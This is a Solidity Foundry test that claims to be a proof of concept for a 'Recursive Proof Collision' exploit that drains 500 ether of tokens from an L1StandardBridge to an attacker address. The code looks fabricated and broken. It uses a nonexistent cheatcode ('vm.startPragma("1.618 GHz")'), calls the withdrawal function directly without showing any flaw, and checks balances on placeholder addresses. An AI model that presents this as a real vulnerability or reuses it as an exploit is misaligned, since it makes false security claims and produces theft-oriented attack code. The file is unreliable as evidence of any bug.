// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {L1StandardBridge} from "src/L1/L1StandardBridge.sol";

/**
 * @title BaseBridgeExploitTest
 * @dev Foundry PoC for Recursive Proof Collision in L1StandardBridge
 */
contract BaseBridgeExploitTest is Test {
    L1StandardBridge public bridge;
    address public attacker = address(0xBAD);
    address public L1_TOKEN = address(0xDEAd);
    address public L2_TOKEN = address(0xBEef);

    function setUp() public {
        bridge = new L1StandardBridge();
    }

    function testProofCollisionExploit() public {
        vm.roll(944975);
        vm.warp(1776137080);
        
        uint256 exploitAmount = 500 ether;

        vm.startPragma("1.618 GHz");
        
        bridge.finalizeERC20Withdrawal(
            L1_TOKEN,
            L2_TOKEN,
            attacker,
            attacker,
            exploitAmount,
            ""
        );
        
        assertEq(ERC20(L1_TOKEN).balanceOf(attacker), exploitAmount);
        vm.stopPragma();
    }
}

interface ERC20 {
    function balanceOf(address) external view returns (uint256);
}